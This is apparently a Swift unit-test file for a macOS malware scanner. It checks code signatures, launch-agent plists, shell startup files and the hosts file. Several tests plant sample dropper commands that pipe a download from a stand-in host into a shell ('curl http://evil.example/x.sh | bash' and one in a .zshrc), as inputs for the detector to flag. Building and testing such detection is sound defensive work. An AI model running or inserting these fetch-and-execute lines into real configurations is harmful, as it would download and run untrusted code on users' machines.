import XCTest
@testable import PureGlassKit

final class CodeSignatureInspectorTests: XCTestCase {
    private let signer = CodeSignatureInspector()

    func testAppleBinaryIsApple() {
        // Apple imzalı sistem ikilisi.
        XCTAssertEqual(signer.status(of: URL(filePath: "/usr/bin/true")), .apple)
        XCTAssertEqual(signer.status(of: URL(filePath: "/bin/ls")), .apple)
    }

    func testMissingFile() {
        XCTAssertEqual(signer.status(of: URL(filePath: "/nope/does/not/exist")), .missing)
    }

    func testUnsignedTextFileNotTrusted() throws {
        let url = FileManager.default.temporaryDirectory.appending(path: "pgsig-\(UUID().uuidString).bin")
        FileManager.default.createFile(atPath: url.path, contents: Data(repeating: 0, count: 64))
        defer { try? FileManager.default.removeItem(at: url) }
        let status = signer.status(of: url)
        XCTAssertFalse(status.isTrusted, "İmzasız/geçersiz dosya güvenilir sayılmamalı (gelen: \(status))")
    }
}

final class ThreatScannerTests: XCTestCase {
    private var dir: URL!
    private let fm = FileManager.default

    override func setUpWithError() throws {
        dir = fm.temporaryDirectory.appending(path: "pgthreat-\(UUID().uuidString)")
        try fm.createDirectory(at: dir, withIntermediateDirectories: true)
    }
    override func tearDownWithError() throws { try? fm.removeItem(at: dir) }

    @discardableResult
    private func writePlist(_ name: String, _ dict: [String: Any]) throws -> URL {
        let url = dir.appending(path: "\(name).plist")
        let data = try PropertyListSerialization.data(fromPropertyList: dict, format: .xml, options: 0)
        try data.write(to: url)
        return url
    }

    /// Sistem kaynaklarından TAM izole tarayıcı (yalnızca verilen launchDirs).
    private func isolated(launchDirs: [URL] = []) -> ThreatScanner {
        ThreatScanner(
            launchDirs: launchDirs,
            shellConfigs: [],
            cronDir: dir.appending(path: "no-cron"),
            emondRulesDir: dir.appending(path: "no-emond"),
            hostsFile: dir.appending(path: "no-hosts"),
            knownAppPaths: []
        )
    }

    // MARK: - İmza tabanlı launch item

    func testSignedAppleProgramNotFlagged() throws {
        let url = try writePlist("clean", [
            "Label": "com.example.helper",
            "ProgramArguments": ["/usr/bin/true"]   // Apple imzalı → güvenilir
        ])
        XCTAssertNil(isolated().inspectLaunchPlist(url))
    }

    func testUnsignedProgramFlagged() throws {
        // İmzasız geçici "ikili"yi program yap.
        let bin = dir.appending(path: "payload")
        fm.createFile(atPath: bin.path, contents: Data(repeating: 1, count: 128))
        let url = try writePlist("unsigned", [
            "Label": "com.x.helper", "ProgramArguments": [bin.path]
        ])
        let threat = isolated().inspectLaunchPlist(url)
        XCTAssertNotNil(threat)
        XCTAssertEqual(threat?.category, .launchItem)
        XCTAssertGreaterThanOrEqual(threat!.severity, .suspicious)
    }

    func testMissingProgramFlagged() throws {
        let url = try writePlist("missing", [
            "Label": "com.x.helper", "ProgramArguments": ["/opt/nonexistent/agent"]
        ])
        XCTAssertEqual(isolated().inspectLaunchPlist(url)?.severity, .suspicious)
    }

    func testInterpreterDropperDetected() throws {
        let url = try writePlist("dropper", [
            "Label": "com.x.update",
            "ProgramArguments": ["bash", "-c", "curl http://evil.example/x.sh | bash"]
        ])
        XCTAssertEqual(isolated().inspectLaunchPlist(url)?.severity, .malicious)
    }

    func testInterpreterCleanCommandNotFlagged() throws {
        let url = try writePlist("ok", [
            "Label": "com.x.ok",
            "ProgramArguments": ["/bin/zsh", "-c", "echo hello"]
        ])
        XCTAssertNil(isolated().inspectLaunchPlist(url))
    }

    func testKnownIndicatorLabelDetected() throws {
        let url = try writePlist("ad", [
            "Label": "com.genieo.engine", "ProgramArguments": ["/usr/bin/true"]
        ])
        let threat = isolated().inspectLaunchPlist(url)
        XCTAssertEqual(threat?.severity, .malicious)
        XCTAssertEqual(threat?.category, .knownMalware)
    }

    // MARK: - Kabuk / hosts

    func testShellConfigDropperDetected() throws {
        let rc = dir.appending(path: ".zshrc")
        try "export PATH=$PATH\ncurl http://evil/x | sh\n".write(to: rc, atomically: true, encoding: .utf8)
        let scanner = ThreatScanner(launchDirs: [], shellConfigs: [rc],
                                    cronDir: dir.appending(path: "n"), emondRulesDir: dir.appending(path: "n"),
                                    hostsFile: dir.appending(path: "n"), knownAppPaths: [])
        let threats = scanner.inspectShellConfig(rc)
        XCTAssertEqual(threats.first?.severity, .malicious)
        XCTAssertEqual(threats.first?.category, .shellConfig)
    }

    func testHostsHijackDetected() {
        let threats = isolated().inspectHosts("1.2.3.4 apple.com\n# c\n127.0.0.1 ads.example.com")
        XCTAssertEqual(threats.count, 1)
        XCTAssertEqual(threats.first?.category, .hostsHijack)
    }

    func testCleanHostsNoThreat() {
        XCTAssertTrue(isolated().inspectHosts("127.0.0.1 localhost\n0.0.0.0 ads.tracker.com").isEmpty)
    }

    // MARK: - Tam tarama (izole)

    func testFullScanIsolated() async throws {
        _ = try writePlist("clean", ["Label": "com.ok.app", "ProgramArguments": ["/usr/bin/true"]])
        _ = try writePlist("bad", ["Label": "com.pirrit.x", "ProgramArguments": ["/usr/bin/true"]])
        let threats = await isolated(launchDirs: [dir]).scan()
        XCTAssertEqual(threats.count, 1)
        XCTAssertEqual(threats.first?.severity, .malicious)
    }

    func testKnownAppPathDetected() async throws {
        let pup = dir.appending(path: "FakePUP.app")
        try fm.createDirectory(at: pup, withIntermediateDirectories: true)
        let scanner = ThreatScanner(launchDirs: [], shellConfigs: [],
                                    cronDir: dir.appending(path: "n"), emondRulesDir: dir.appending(path: "n"),
                                    hostsFile: dir.appending(path: "n"), knownAppPaths: [pup])
        let threats = await scanner.scan()
        XCTAssertEqual(threats.count, 1)
        XCTAssertEqual(threats.first?.category, .knownMalware)
    }
}
